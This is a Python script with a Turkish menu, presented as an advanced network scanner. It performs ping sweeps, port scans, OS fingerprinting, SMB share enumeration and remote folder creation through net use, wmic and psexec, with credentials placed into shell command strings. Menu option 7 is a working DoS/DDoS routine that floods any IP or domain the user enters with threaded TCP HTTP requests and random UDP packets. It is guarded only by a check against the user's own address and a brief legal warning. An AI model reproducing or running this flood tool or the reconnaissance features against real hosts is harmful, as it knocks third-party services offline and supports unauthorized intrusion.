import platform
import subprocess
import socket
import re
import os
import sys
import threading
import time
import random
from datetime import datetime
from queue import Queue

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def pause():
    input(f"{Colors.BLUE}\nDevam etmek için Enter'a basın...{Colors.END}")
    clear_screen()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "192.168.1.1"

def get_network_range():
    local_ip = get_local_ip()
    if local_ip.count('.') == 3:
        return '.'.join(local_ip.split('.')[:3]) + '.0/24'
    return "192.168.1.0/24"

def get_arp_table():
    arp_table = {}
    if platform.system() == "Windows":
        try:
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            for line in result.stdout.split('\n'):
                if re.match(r"^\d+\.\d+\.\d+\.\d+", line.strip()):
                    parts = re.split(r"\s+", line.strip())
                    if len(parts) >= 2:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":").upper()
                        if mac != "FF:FF:FF:FF:FF:FF" and not ip.startswith(('224.', '239.')):
                            arp_table[ip] = mac
        except:
            pass
    else:
        try:
            result = subprocess.run(["arp", "-an"], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            for line in result.stdout.split('\n'):
                match = re.match(r".*\((.*)\).*(([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2})", line)
                if match and not match.group(1).startswith(('224.', '239.')):
                    arp_table[match.group(1)] = match.group(2).upper()
        except:
            pass
    return arp_table

def ping_sweep(network_range):
    active_hosts = {}
    ip_prefix = '.'.join(network_range.split('.')[:3])
    
    def ping_host(ip):
        try:
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            command = ['ping', param, '1', '-w', '500', ip]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0 and "TTL=" in str(result.stdout):
                active_hosts[ip] = "Alive"
        except:
            pass

    threads = []
    for i in range(1, 255):
        ip = f"{ip_prefix}.{i}"
        t = threading.Thread(target=ping_host, args=(ip,))
        threads.append(t)
        t.start()

        if len(threads) >= 50:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    return active_hosts

def detect_device_type(mac, hostname, open_ports=[]):
    if not mac or mac == "MAC Bulunamadı":
        return ""

    device_db = {
        'windows': {
            'ouis': {'00:50:F2', '00:0C:29', '00:1D:72', '00:15:5D', '00:1A:2B', '00:25:B3'},
            'patterns': ['win', 'windows', 'desktop', 'pc', 'mshome', 'workstation', 'server'],
            'ports': [3389, 445, 139, 135, 49152, 5985]
        },
        'linux': {
            'ouis': {'00:1C:42', '00:0F:4B', '00:16:3E', '00:1E:67', '00:24:1D', '00:26:B9'},
            'patterns': ['linux', 'ubuntu', 'debian', 'raspberrypi', 'centos', 'fedora', 'redhat'],
            'ports': [22, 111, 2049, 631, 3306, 5432]
        },
        'macos': {
            'ouis': {'00:03:93', '00:05:02', '00:0A:27', '00:1C:B3', '00:23:DF', '00:25:BC'},
            'patterns': ['mac', 'macbook', 'imac', 'macmini', 'appletv'],
            'ports': [548, 3283, 5900, 22]
        },
        'android': {
            'ouis': {'34:BB:1F', '3C:5A:B4', '00:1A:11', '00:26:BB', '08:00:28', '38:AA:3C'},
            'patterns': ['android', 'galaxy', 'sm-', 'redmi', 'pixel', 'oneplus'],
            'ports': [5353, 41794, 5555, 62078]
        },
        'ios': {
            'ouis': {'00:03:93', 'F0:18:98', '00:23:DF', '00:25:BC', '00:26:08', '00:26:B0'},
            'patterns': ['iphone', 'ipad', 'ipod', 'apple tv'],
            'ports': [62078, 5353, 5223, 443]
        },
        'tv': {
            'ouis': {'00:09:DF', 'A4:4C:C8', '00:24:8C', '00:26:5E', '00:1E:3B', '00:1F:16'},
            'patterns': ['tv', 'bravia', 'lgnetcast', 'samsungtv', 'smarttv'],
            'ports': [8008, 8060, 9080, 7676]
        },
        'router': {
            'ouis': {'00:1A:2B', '38:88:1E', '00:1D:7E', '00:1F:33', '00:22:93', '00:24:01'},
            'patterns': ['router', 'modem', 'gateway', 'asus', 'tplink', 'netgear'],
            'ports': [80, 443, 7547, 8080, 23]
        },
        'iot': {
            'ouis': {'00:1A:11', '00:26:BB', '00:18:FE', '00:1C:DF', '00:21:86', '00:24:36'},
            'patterns': ['nest', 'ring', 'hue', 'smart', 'iot', 'camera'],
            'ports': [8080, 8888, 8000, 554]
        },
        'printer': {
            'ouis': {'00:15:99', '00:19:85', '00:1D:38', '00:21:5A', '00:26:73', '00:1E:8F'},
            'patterns': ['printer', 'hp', 'epson', 'canon', 'brother'],
            'ports': [515, 631, 9100]
        },
        'nas': {
            'ouis': {'00:14:2A', '00:1F:16', '00:24:01', '00:25:90', '00:26:2D', '00:1C:C4'},
            'patterns': ['nas', 'synology', 'qnap', 'netapp', 'storage'],
            'ports': [5000, 5001, 873, 2049]
        }
    }

    mac_prefix = mac[:8].upper()
    hostname_lower = hostname.lower() if hostname else ""

    port_os = None
    for os_name, data in device_db.items():
        if any(port in open_ports for port in data['ports']):
            port_os = os_name
            break

    detected_os = None
    detected_device = None
    
    for os_name, data in device_db.items():
        if (mac_prefix[:5] in [oui[:5] for oui in data['ouis']] or 
            any(p in hostname_lower for p in data['patterns'])):
            detected_os = os_name
            break

    for dev_name, data in device_db.items():
        if dev_name not in ['windows', 'linux', 'macos']:
            if (mac_prefix[:5] in [oui[:5] for oui in data['ouis']] or 
                any(p in hostname_lower for p in data['patterns'])):
                detected_device = dev_name
                break

    final_os = port_os or detected_os
    final_device = detected_device or ('pc' if final_os in ['windows', 'linux', 'macos'] else None)

    color_map = {
        'windows': Colors.BLUE,
        'linux': Colors.YELLOW,
        'macos': Colors.WHITE,
        'android': Colors.GREEN,
        'ios': Colors.PURPLE,
        'tv': Colors.PURPLE,
        'router': Colors.CYAN,
        'iot': Colors.GREEN,
        'printer': Colors.WHITE,
        'nas': Colors.CYAN
    }

    if final_os and final_device:
        if final_os == final_device:
            return f"{color_map.get(final_os, Colors.CYAN)}({final_os.upper()}){Colors.END}"
        else:
            return f"{color_map.get(final_os, Colors.CYAN)}({final_os.capitalize()} {final_device.capitalize()}){Colors.END}"
    elif final_os:
        return f"{color_map.get(final_os, Colors.CYAN)}({final_os.upper()}){Colors.END}"
    elif final_device:
        return f"{color_map.get(final_device, Colors.CYAN)}({final_device.upper()}){Colors.END}"
    elif 'mshome' in hostname_lower or 'home' in hostname_lower:
        return f"{Colors.YELLOW}(Yerel Ağ Cihazı){Colors.END}"
    elif any(x in hostname_lower for x in ['printer', 'print']):
        return f"{Colors.WHITE}(Yazıcı){Colors.END}"
    
    return f"{Colors.CYAN}(Bilinmeyen Cihaz){Colors.END}"

def resolve_hostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        if any(hostname.endswith(x) for x in ['.local', '.mshome.net', '.lan']):
            return hostname.split('.')[0]
        return hostname
    except:
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["nbtstat", "-A", ip], capture_output=True, text=True, encoding='utf-8', errors='ignore')
                if "UNIQUE" in result.stdout:
                    match = re.search(r"<00>\s+UNIQUE\s+([^\s]+)", result.stdout)
                    if match:
                        return match.group(1).upper()
        except:
            pass
        return "Bilinmiyor"

def scan_ports(ip, ports_to_scan=None):
    if ports_to_scan is None:
        ports_to_scan = [21, 22, 23, 80, 443, 3389, 8080, 445, 139, 548, 8008, 62078, 5900, 515, 631, 9100]
    
    open_ports = []
    port_queue = Queue()
    
    for port in ports_to_scan:
        port_queue.put(port)
    
    def worker():
        while not port_queue.empty():
            port = port_queue.get()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((ip, port)) == 0:
                        open_ports.append(port)
            except:
                continue
            port_queue.task_done()
    
    threads = []
    for _ in range(20):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    return sorted(open_ports)

def get_shared_resources(ip):
    shared = []
    if platform.system() == "Windows":
        try:
            result = subprocess.run(["net", "view", f"\\\\{ip}"], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            for line in result.stdout.split('\n'):
                if "Disk" in line or "Yazıcı" in line or "Printer" in line:
                    shared.append(line.split()[0])
        except:
            pass
    else:
        try:
            result = subprocess.run(["smbclient", "-L", f"//{ip}", "-N"], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            for line in result.stdout.split('\n'):
                if "Disk" in line or "Printer" in line:
                    shared.append(line.split()[0])
        except:
            pass
    return shared

def get_os_info(ip):
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["nmap", "-O", ip], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            if "Running:" in result.stdout:
                return re.search(r"Running: (.*?)\n", result.stdout).group(1)
        else:
            result = subprocess.run(["nmap", "-O", ip], capture_output=True, text=True, encoding='utf-8', errors='ignore')
            if "Running:" in result.stdout:
                return re.search(r"Running: (.*?)\n", result.stdout).group(1)
    except:
        pass
    return "Bilinmiyor"

def display_results(devices):
    print(f"\n{Colors.BLUE}{Colors.BOLD}📊 Tarama Sonuçları:{Colors.END}")
    print("="*120)
    print(f"{'No'.ljust(3)} | {'IP'.ljust(15)} | {'MAC'.ljust(17)} | {'Hostname'.ljust(20)} | {'Tip'.ljust(25)} | {'Açık Portlar'.ljust(20)} | {'OS Bilgisi'}")
    print("-"*120)
    for i, device in enumerate(devices, 1):
        print(f"{str(i).ljust(3)} | {device['IP'].ljust(15)} | {device['MAC'].ljust(17)} | "
              f"{device['Hostname'].ljust(20)} | {device['Type'].ljust(25)} | "
              f"{', '.join(map(str, device['Ports'])).ljust(20)} | {device['OS']}")
    print(f"\n{Colors.GREEN}{Colors.BOLD}Toplam {len(devices)} aktif cihaz bulundu.{Colors.END}")

def scan_single_device(ip):
    try:
        print(f"\n{Colors.BLUE}{Colors.BOLD}🔍 Cihaz Detayları: {ip}{Colors.END}")
        print(f"{Colors.CYAN}⏳ Tarama başlatılıyor...{Colors.END}")
        
        arp_table = get_arp_table()
        if ip not in arp_table:
            if ip in ping_sweep(get_network_range()):
                mac = "MAC Bulunamadı (Canlı)"
            else:
                print(f"{Colors.RED}❌ Cihaz bulunamadı veya yanıt vermiyor{Colors.END}")
                return
        else:
            mac = arp_table[ip]
        
        hostname = resolve_hostname(ip)
        
        print(f"{Colors.CYAN}🔓 Port taraması yapılıyor...{Colors.END}")
        open_ports = scan_ports(ip)
        
        device_type = detect_device_type(mac, hostname, open_ports)
        
        print(f"{Colors.CYAN}🖥️  İşletim sistemi tespit ediliyor...{Colors.END}")
        os_info = get_os_info(ip)
        
        print(f"{Colors.CYAN}📂 Paylaşımlar taranıyor...{Colors.END}")
        shares = get_shared_resources(ip)
        
        print(f"\n{Colors.BLUE}{Colors.BOLD}🔍 Cihaz Detayları:{Colors.END}")
        print(f"{Colors.WHITE}IP: {Colors.CYAN}{ip}{Colors.END}")
        print(f"{Colors.WHITE}MAC: {Colors.CYAN}{mac}{Colors.END}")
        print(f"{Colors.WHITE}Hostname: {Colors.CYAN}{hostname}{Colors.END}")
        print(f"{Colors.WHITE}Tip: {device_type}")
        print(f"{Colors.WHITE}Açık Portlar: {Colors.CYAN}{', '.join(map(str, open_ports)) or 'Yok'}{Colors.END}")
        print(f"{Colors.WHITE}İşletim Sistemi: {Colors.CYAN}{os_info}{Colors.END}")
        print(f"{Colors.WHITE}Paylaşımlar: {Colors.CYAN}{', '.join(shares) or 'Yok'}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}❌ Hata: {str(e)}{Colors.END}")

def create_remote_folder(ip):
    if platform.system() != "Windows":
        print(f"{Colors.RED}❌ Sadece Windows destekleniyor{Colors.END}")
        return

    try:
        if ip in ["127.0.0.1", "localhost", get_local_ip()]:
            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'Selam')
            os.makedirs(desktop_path, exist_ok=True)
            print(f"{Colors.GREEN}✅ Klasör oluşturuldu: {desktop_path}{Colors.END}")
            return
        
        username = input(f"{Colors.BLUE}Hedef bilgisayar kullanıcı adı: {Colors.END}")
        password = input(f"{Colors.BLUE}Şifre: {Colors.END}")
        
        methods = [
            f'net use \\\\{ip}\\C$ /user:{username} {password} && mkdir \\\\{ip}\\C$\\Users\\Public\\Desktop\\Selam',
            f'wmic /node:"{ip}" /user:"{username}" /password:"{password}" process call create "cmd /c mkdir C:\\Users\\Public\\Desktop\\Selam"',
            f'psexec \\\\{ip} -u {username} -p {password} cmd /c mkdir C:\\Users\\Public\\Desktop\\Selam'
        ]
        
        for method in methods:
            try:
                result = subprocess.run(method, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"{Colors.GREEN}✅ Klasör oluşturuldu: \\\\{ip}\\C$\\Users\\Public\\Desktop\\Selam{Colors.END}")
                    return
            except:
                continue
        
        print(f"{Colors.RED}❌ Klasör oluşturulamadı. Sebepler:{Colors.END}")
        print("- Kullanıcı adı/şifre hatalı")
        print("- Paylaşım izinleri yetersiz")
        print("- Güvenlik duvarı engelliyor olabilir")
        print("- Uzak bilgisayarda WMI/Powershell erişimi kapalı")
    except Exception as e:
        print(f"{Colors.RED}❌ Hata: {str(e)}{Colors.END}")

def send_ping(ip, count):
    try:
        target_ip = ip if ip else get_local_ip()
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        print(f"\n{Colors.CYAN}🔄 {target_ip} adresine {count} ping gönderiliyor...{Colors.END}")
        result = subprocess.run(['ping', param, str(count), target_ip], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}{Colors.BOLD}📡 Ping Sonuçları:{Colors.END}")
            print(result.stdout)
        else:
            print(f"{Colors.RED}❌ Ping gönderimi başarısız: {result.stderr}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Hata: {str(e)}{Colors.END}")

def ddos_attack(target, duration=10, thread_count=100):
    try:
        # Yerel IP'yi al
        local_ip = get_local_ip()
        
        # Hedef boşsa hata ver
        if not target:
            print(f"{Colors.RED}❌ Hedef belirtilmedi! Lütfen bir IP veya domain girin.{Colors.END}")
            return
        
        # IP formatını kontrol et
        is_ip = re.match(r"^\d+\.\d+\.\d+\.\d+$", target)
        target_ip = None
        original_target = target
        
        if is_ip:
            # IP girildiyse direkt kullan
            target_ip = target
            target_type = "IP"
        else:
            # Domain girildiyse IP'ye çevir
            try:
                target_ip = socket.gethostbyname(target)
                target_type = "Domain"
                print(f"{Colors.YELLOW}🔍 Domain '{target}' IP'ye çevrildi: {target_ip}{Colors.END}")
            except socket.gaierror:
                print(f"{Colors.RED}❌ Geçersiz domain: '{target}' çözümlenemedi!{Colors.END}")
                return
        
        # Kendi IP'mize saldırı engelle
        if target_ip == local_ip or target_ip == "127.0.0.1":
            print(f"{Colors.RED}❌ Kendi IP'nize saldırı gönderemezsiniz! Yerel IP: {local_ip}, Hedef IP: {target_ip}{Colors.END}")
            return

        # Saldırı bilgilerini göster
        if target_type == "IP":
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  {target_ip} IP adresine DDoS saldırısı başlatılıyor! (Yasal uyarı: Kendi ağınızda test edin!){Colors.END}")
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}⚠️  {original_target} sitesine (IP: {target_ip}) DDoS saldırısı başlatılıyor! (Yasal uyarı: Kendi ağınızda test edin!){Colors.END}")
        
        print(f"{Colors.CYAN}⏳ Süre: {duration} saniye, İş Parçacığı Sayısı: {thread_count}{Colors.END}")
        print(f"{Colors.YELLOW}🔍 Yerel IP: {local_ip} | Hedef IP: {target_ip}{Colors.END}")

        stop_attack = False
        ports = [80, 443, 22, 23, 3389, 8080]  # Hedeflenecek yaygın portlar
        packet_count = 0

        def tcp_flood():
            nonlocal packet_count, stop_attack
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    port = random.choice(ports)
                    s.connect((target_ip, port))
                    if target_type == "Domain":
                        s.send(b"GET / HTTP/1.1\r\nHost: " + original_target.encode() + b"\r\n\r\n")
                    else:
                        s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                    packet_count += 1
                    s.close()
                except:
                    pass

        def udp_flood():
            nonlocal packet_count, stop_attack
            while not stop_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    port = random.choice(ports)
                    data = random._urandom(1024)  # Rastgele 1KB veri
                    s.sendto(data, (target_ip, port))
                    packet_count += 1
                    s.close()
                except:
                    pass

        threads = []
        for _ in range(thread_count // 2):  # Yarısı TCP, yarısı UDP
            t_tcp = threading.Thread(target=tcp_flood)
            t_udp = threading.Thread(target=udp_flood)
            t_tcp.start()
            t_udp.start()
            threads.extend([t_tcp, t_udp])

        time.sleep(duration)  # Belirtilen süre kadar çalışır
        stop_attack = True

        for t in threads:
            t.join()

        print(f"{Colors.GREEN}✅ DDoS saldırısı tamamlandı. Gönderilen paket sayısı: {packet_count}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ DDoS saldırısı sırasında hata: {str(e)}{Colors.END}")

def advanced_scan():
    try:
        clear_screen()
        local_ip = get_local_ip()
        network_range = get_network_range()
        
        print(f"{Colors.BLUE}{Colors.BOLD}🔍 Gelişmiş Ağ Taraması Başlatılıyor{Colors.END}")
        print(f"{Colors.BLUE}⏳ Başlangıç zamanı: {datetime.now().strftime('%H:%M:%S')}{Colors.END}")
        print(f"{Colors.CYAN}📍 Yerel IP: {local_ip}{Colors.END}")
        print(f"{Colors.CYAN}🌐 Ağ Aralığı: {network_range}{Colors.END}\n")
        
        print(f"{Colors.CYAN}🔄 Aktif cihazlar taranıyor (Ping Sweep)...{Colors.END}")
        active_hosts = ping_sweep(network_range)
        
        print(f"{Colors.CYAN}🔄 ARP tablosu alınıyor...{Colors.END}")
        arp_table = get_arp_table()
        
        print(f"{Colors.CYAN}🔄 Cihaz bilgileri toplanıyor...{Colors.END}")
        devices = []
        
        all_ips = set(active_hosts.keys()).union(set(arp_table.keys()))
        
        for ip in all_ips:
            try:
                mac = arp_table.get(ip, "MAC Bulunamadı")
                hostname = resolve_hostname(ip)
                
                ports = []
                def port_scan():
                    nonlocal ports
                    ports = scan_ports(ip)
                
                port_thread = threading.Thread(target=port_scan)
                port_thread.start()
                
                device_type = (f"{Colors.CYAN}(BU BİLGİSAYAR){Colors.END}" if ip == local_ip 
                              else detect_device_type(mac, hostname, []))
                os_info = get_os_info(ip)
                
                port_thread.join()
                
                devices.append({
                    'IP': ip, 
                    'MAC': mac, 
                    'Hostname': hostname,
                    'Type': device_type,
                    'Ports': ports,
                    'OS': os_info
                })
                
                print(f"{Colors.GREEN}✅ {ip.ljust(15)} | {mac.ljust(17)} | {hostname.ljust(20)} {device_type}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}❌ {ip} taramasında hata: {str(e)}{Colors.END}")
                continue
        
        return devices
    except Exception as e:
        print(f"{Colors.RED}❌ Tarama hatası: {str(e)}{Colors.END}")
        return []

def main_menu():
    clear_screen()
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== GELİŞMİŞ AĞ TARAYICI ===")
    print(f"{Colors.WHITE}1. Tüm Ağı Tara (Gelişmiş Ping + ARP + Port Tarama)")
    print(f"2. Tek Cihaz Tara (Detaylı)")
    print(f"3. Port Taraması Yap (Hızlı)")
    print(f"4. Paylaşılan Kaynakları Listele")
    print(f"5. Uzak Bilgisayarda Klasör Oluştur")
    print(f"6. Ping Gönder")
    print(f"7. Dos&Ddos Gönder")
    print(f"8. Çıkış{Colors.END}")
    print(f"{Colors.CYAN}=========================={Colors.END}")

if __name__ == "__main__":
    try:
        while True:
            main_menu()
            choice = input(f"{Colors.BLUE}{Colors.BOLD}Seçiminiz (1-8): {Colors.END}")
            
            if choice == "1":
                devices = advanced_scan()
                display_results(devices)
                pause()
            elif choice == "2":
                ip = input("IP adresi girin: ")
                if not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    print(f"{Colors.RED}❌ Geçersiz IP adresi{Colors.END}")
                else:
                    scan_single_device(ip)
                pause()
            elif choice == "3":
                ip = input("IP adresi girin: ")
                if not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    print(f"{Colors.RED}❌ Geçersiz IP adresi{Colors.END}")
                else:
                    ports = input("Portlar (virgülle, varsayılan: 21,22,80,443,3389,8080): ")
                    ports_to_scan = list(map(int, ports.split(','))) if ports else [21, 22, 80, 443, 3389, 8080]
                    print(f"\n{Colors.CYAN}🔓 Port taraması başlatılıyor...{Colors.END}")
                    open_ports = scan_ports(ip, ports_to_scan)
                    print(f"\n{Colors.GREEN}{Colors.BOLD}🔓 Açık Portlar: {', '.join(map(str, open_ports)) or 'Yok'}{Colors.END}")
                pause()
            elif choice == "4":
                ip = input("IP adresi girin: ")
                if not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    print(f"{Colors.RED}❌ Geçersiz IP adresi{Colors.END}")
                else:
                    shares = get_shared_resources(ip)
                    print(f"\n{Colors.BLUE}{Colors.BOLD}📂 Paylaşımlar: {', '.join(shares) or 'Yok'}{Colors.END}")
                pause()
            elif choice == "5":
                ip = input("Hedef IP (boş bırakırsanız kendi bilgisayarınız): ")
                if ip and not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    print(f"{Colors.RED}❌ Geçersiz IP adresi{Colors.END}")
                else:
                    create_remote_folder(ip or "127.0.0.1")
                pause()
            elif choice == "6":
                ip = input("Hedef IP (boş bırakırsanız kendi bilgisayarınız): ")
                if ip and not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    print(f"{Colors.RED}❌ Geçersiz IP adresi{Colors.END}")
                else:
                    try:
                        count = int(input("Kaç ping gönderilsin (varsayılan 4): ") or 4)
                        if count <= 0:
                            print(f"{Colors.RED}❌ Ping sayısı pozitif bir tam sayı olmalı{Colors.END}")
                        else:
                            send_ping(ip, count)
                    except ValueError:
                        print(f"{Colors.RED}❌ Geçersiz ping sayısı{Colors.END}")
                pause()
            elif choice == "7":
                target = input("Hedef IP veya Domain girin: ")
                try:
                    duration = int(input("Saldırı süresi (saniye, varsayılan 10): ") or 10)
                    thread_count = int(input("İş parçacığı sayısı (varsayılan 100): ") or 100)
                    if duration <= 0 or thread_count <= 0:
                        print(f"{Colors.RED}❌ Süre ve iş parçacığı sayısı pozitif olmalı{Colors.END}")
                    else:
                        ddos_attack(target, duration, thread_count)
                except ValueError:
                    print(f"{Colors.RED}❌ Geçersiz giriş{Colors.END}")
                pause()
            elif choice == "8":
                print(f"{Colors.GREEN}Çıkış yapılıyor...{Colors.END}")
                break
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.END}")
                pause()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}İşlem iptal edildi.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Kritik Hata: {str(e)}{Colors.END}")
